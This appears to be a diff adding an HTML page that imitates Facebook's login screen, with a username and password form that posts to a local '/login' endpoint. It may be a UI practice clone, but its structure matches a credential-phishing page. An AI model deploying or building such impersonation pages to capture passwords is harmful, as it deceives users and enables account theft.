@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #fff;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 5px;
+      margin-top: 100px;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      background-color: #1877f2;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #0e63ac;
+    }
+
+    .text-center {
+      text-align: center;
+    }
+    .fac{
+        color:#0e63ac;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2 class="fac">Log In to Facebook</h2>
+    <form action="/login" method="POST">
+      <input type="text" placeholder="Email or Phone Number" name="username">
+      <input type="password" placeholder="Password" name="password">
+      <input type="submit" value="Log In">
+    </form>
+    <p class="text-center">Forgot password? <a href="#">Click here</a></p>
+  </div>
+</body>
+
+</html>
